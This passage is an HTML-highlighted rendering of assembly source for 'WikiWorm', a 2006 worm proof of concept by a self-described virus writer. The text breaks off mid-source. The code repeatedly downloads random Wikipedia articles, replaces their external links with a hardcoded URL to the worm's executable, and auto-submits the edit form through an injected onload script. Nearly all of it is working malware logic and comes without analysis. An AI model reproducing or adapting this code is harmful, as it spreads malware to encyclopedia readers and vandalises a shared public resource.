<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Trojan.Win32.Agent.un - wikiworm.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;[WikiWorm];;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; WikiWorm</span><span class="sc0">
</span><span class="sc1">;; by Second Part To Hell</span><span class="sc0">
</span><span class="sc1">;; www.spth.de.vu</span><span class="sc0">
</span><span class="sc1">;; spth@priest.com</span><span class="sc0">
</span><span class="sc1">;; written in May 2006</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; This is the probably first malware which uses wikipedia for</span><span class="sc0">
</span><span class="sc1">;; spreading. It downloads a random article, searchs the title</span><span class="sc0">
</span><span class="sc1">;; of the article, downloads the article's edit page, changes</span><span class="sc0">
</span><span class="sc1">;; all external wiki links to a worm-download-page, and opens</span><span class="sc0">
</span><span class="sc1">;; the HTML file.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; This is a simple POC version - but imagine the virus would</span><span class="sc0">
</span><span class="sc1">;; create a HTTP-server at the victims computer and change the</span><span class="sc0">
</span><span class="sc1">;; links to the IP ('http://127.0.0.1/worm.exe' - for example).</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; More information about wikipedia, see my article in rRlf#7.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;[WikiWorm];;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc12">'..\FASM\INCLUDE\win32ax.inc'</span><span class="sc0">

    </span><span class="sc5">URLWormDownload</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">52</span><span class="sc0">
    </span><span class="sc5">onLoadStringLen</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">68</span><span class="sc0">
    </span><span class="sc5">methodpostlen</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">22</span><span class="sc0">
    </span><span class="sc5">VirtualAllocSize</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0x80000</span><span class="sc0">
    </span><span class="sc5">MethodChangeSize</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">23</span><span class="sc0">
    </span><span class="sc5">InetLength</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">34</span><span class="sc0">
    </span><span class="sc5">szFileNameLength</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
    </span><span class="sc5">memory_alloc</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">memory_alloc2</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">szURL</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'http://en.wikipedia.org/wiki/Special:Random'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">szFileName</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'downloaded.html'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">hArticleF</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">ddArticleSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">hArticleMap</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">hArticleMapView</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">ArticleNameSt</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">ArticleNameLen</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">


    </span><span class="sc5">EditLinkStart</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'http://en.wikipedia.org/w/index.php?title='</span><span class="sc0">
    </span><span class="sc5">EndEditLinkStart</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc5">EditLinkEnd</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&amp;action=edit'</span><span class="sc0">
    </span><span class="sc5">EndEditLinkEnd</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc5">URLtoWormDownload</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'http://people.freenet.de/artistsroom/information.exe'</span><span class="sc0">

    </span><span class="sc5">LinkStart</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">LinkEnd</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">LinkSize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">

    </span><span class="sc5">onLoadString</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&lt;body ONLOAD="window.setTimeout('</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc4">,</span><span class="sc12">'document.editform.submit()'</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc4">,</span><span class="sc12">', 1 );"&gt;'</span><span class="sc0">
    </span><span class="sc5">BodyDest</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">BodySize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">FALSE_F</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">

    </span><span class="sc5">methodpostURL</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'method="post" action="'</span><span class="sc0">
    </span><span class="sc5">MethodFound</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">MethPointer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">


    </span><span class="sc5">program_dir_reg_subkey</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SOFTWARE\Microsoft\Windows\CurrentVersion'</span><span class="sc4">,</span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">program_dir_reg_value</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ProgramFilesDir'</span><span class="sc4">,</span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">reg_handle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">reg_value_type</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">reg_buffer_size</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x25</span><span class="sc0">
    </span><span class="sc5">reg_buffer</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">times</span><span class="sc0"> </span><span class="sc2">0x25</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">          </span><span class="sc1">; Program-Dir-Buffer</span><span class="sc0">
    </span><span class="sc5">ProgramDirLength</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc5">InetPath</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\Internet Explorer\iexplore.exe" "'</span><span class="sc0">


</span><span class="sc5">STARTUPINFO_struct</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_cb</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_lpReserved</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_lpDesktop</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_lpTitle</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_dwX</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_dwY</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_dwXSize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_dwYSize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_dwXCountChars</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_dwYCountChars</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_dwFillAttribute</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_dwFlags</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_wShowWindow</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_cbReserved2</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_lpReserved2</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_hStdInput</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_hStdOutput</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">StartUp_struct_hStdError</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; end STARTUPINFO</span><span class="sc0">

</span><span class="sc5">PROCESS_INFORMATION_struct</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc5">PROCESS_INFORMATION_hProcess</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">PROCESS_INFORMATION_hThread</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">PROCESS_INFORMATION_dwProcessId</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">PROCESS_INFORMATION_dwThreadId</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; end PROCESS_INFORMATION</span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">MessageBox</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Don't worry - be happy! :)"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Artwork by Second Part To Hell/rRlf"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReserveMemory</span><span class="sc0">           </span><span class="sc1">; Reserve 512KB Memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReserveMemory</span><span class="sc0">           </span><span class="sc1">; Reserve 512KB Memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">wiki_main_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szURL</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DownloadFile</span><span class="sc0">            </span><span class="sc1">; Download the File, URL in eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapViewFile</span><span class="sc0">         </span><span class="sc1">; Create a MapView of szFileName</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SearchArticleName</span><span class="sc0">       </span><span class="sc1">; Search the full name of the article</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MakeEditName</span><span class="sc0">            </span><span class="sc1">; Make the Edit-Name of the article</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MakeEditLink</span><span class="sc0">            </span><span class="sc1">; Make the Edit-Link of the article</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseMapFile</span><span class="sc0">            </span><span class="sc1">; Close the MapView and the File</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DownloadFile</span><span class="sc0">            </span><span class="sc1">; Download the file, URL in eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapViewFile</span><span class="sc0">         </span><span class="sc1">; Create a MapView of szFileName</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ContentToVirtualAlloc</span><span class="sc0">       </span><span class="sc1">; Copy the MapView to the Virtual Alloc</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseMapFile</span><span class="sc0">            </span><span class="sc1">; Close the MapView and the File</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SearchExternalLink</span><span class="sc0">      </span><span class="sc1">; Searchs and changes external wiki links</span><span class="sc0">
                        </span><span class="sc1">; searchs for '[htt' and '[ftp'</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenBodyOnLoad</span><span class="sc0">           </span><span class="sc1">; Make the onload-part</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ChangePostMethod</span><span class="sc0">        </span><span class="sc1">; Change the relative URL of the post-php to a static</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteContentToFile</span><span class="sc0">      </span><span class="sc1">; Write the manipulated content to the file</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExecuteHTMLPage</span><span class="sc0">         </span><span class="sc1">; Open the file now, to save the changes at wikipedia</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EmptyBuffers</span><span class="sc0">            </span><span class="sc1">; Fill Buffers with 0x0</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wiki_main_loop</span><span class="sc0">

</span><span class="sc5">signation</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'POC'</span><span class="sc0">

</span><span class="sc5">ReserveMemory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">VirtualAlloc</span><span class="sc4">,</span><span class="sc0"> \         </span><span class="sc1">; Reserve Memory</span><span class="sc0">
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">VirtualAllocSize</span><span class="sc4">,</span><span class="sc0"> \     </span><span class="sc1">; 512 KB RAM</span><span class="sc0">
        </span><span class="sc2">0x1000</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x4</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DownloadFile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; In: eax=URL</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">URLDownloadToFile</span><span class="sc4">,</span><span class="sc0"> \            </span><span class="sc1">; Download a random article</span><span class="sc0">
        </span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">szFileName</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">NULL</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Sleep</span><span class="sc4">,</span><span class="sc0"> \                </span><span class="sc1">; 2.5seconds for downloading should be enough</span><span class="sc0">
        </span><span class="sc2">2500</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MapViewFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateFile</span><span class="sc4">,</span><span class="sc0"> \               </span><span class="sc1">; Open the file</span><span class="sc0">
        </span><span class="sc5">szFileName</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hArticleF</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Save the handle</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Lwiki_main_loop</span><span class="sc0">         </span><span class="sc1">; If anything does not work, begin again</span><span class="sc0">


    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetFileSize</span><span class="sc4">,</span><span class="sc0"> \          </span><span class="sc1">; Get the Filesize of the file</span><span class="sc0">
        </span><span class="sc4">[</span><span class="sc5">hArticleF</span><span class="sc4">],</span><span class="sc0"> \
        </span><span class="sc5">ddArticleSize</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ddArticleSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateFileMapping</span><span class="sc4">,</span><span class="sc0"> \        </span><span class="sc1">; Create a Map of the File</span><span class="sc0">
        </span><span class="sc4">[</span><span class="sc5">hArticleF</span><span class="sc4">],</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">PAGE_READWRITE</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc4">[</span><span class="sc5">ddArticleSize</span><span class="sc4">],</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hArticleMap</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">MapViewOfFile</span><span class="sc4">,</span><span class="sc0"> \        </span><span class="sc1">; Create a MapViewOfFile</span><span class="sc0">
        </span><span class="sc4">[</span><span class="sc5">hArticleMap</span><span class="sc4">],</span><span class="sc0"> \
        </span><span class="sc5">FILE_MAP_ALL_ACCESS</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc4">[</span><span class="sc5">ddArticleSize</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hArticleMapView</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CloseMapFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">UnmapViewOfFile</span><span class="sc4">,</span><span class="sc0"> \      </span><span class="sc1">; Close MapView</span><span class="sc0">
        </span><span class="sc4">[</span><span class="sc5">hArticleMapView</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> \          </span><span class="sc1">; Close FileMapping</span><span class="sc0">
        </span><span class="sc4">[</span><span class="sc5">hArticleMap</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> \          </span><span class="sc1">; Close File</span><span class="sc0">
        </span><span class="sc4">[</span><span class="sc5">hArticleF</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Lwiki_main_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Trash</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wiki_main_loop</span><span class="sc0">

</span><span class="sc5">SearchArticleName</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hArticleMapView</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">445</span><span class="sc0">            </span><span class="sc1">; Bytes which are before the title (HTML stuff) - excl. meta-keywords</span><span class="sc0">

   </span><span class="sc5">SearchArticleNameLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'&lt;tit'</span><span class="sc0">         </span><span class="sc1">; Articlename by HTML-tag '&lt;title&gt;'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">SearchArticleNameLoop</span><span class="sc0">           </span><span class="sc1">; &lt;title&gt;Anarchism - Wikipedia, the free encyclopedia&lt;/title&gt;</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArticleNameSt</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">SearchArticleNameEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' - W'</span><span class="sc0">         </span><span class="sc1">; End of the article name=' - W'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">SearchArticleNameEnd</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArticleNameSt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArticleNameLen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MakeEditName</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArticleNameLen</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">MakeEditNameLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArticleNameSt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">MENL</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'_'</span><span class="sc0">           </span><span class="sc1">; Change every &lt;space&gt; to '_', as wikipedia uses underlines</span><span class="sc0">
      </span><span class="sc5">MENL</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; instead of &lt;space&gt; for internal links.</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">MakeEditNameLoop</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MakeEditLink</span><span class="sc4">:</span><span class="sc0">
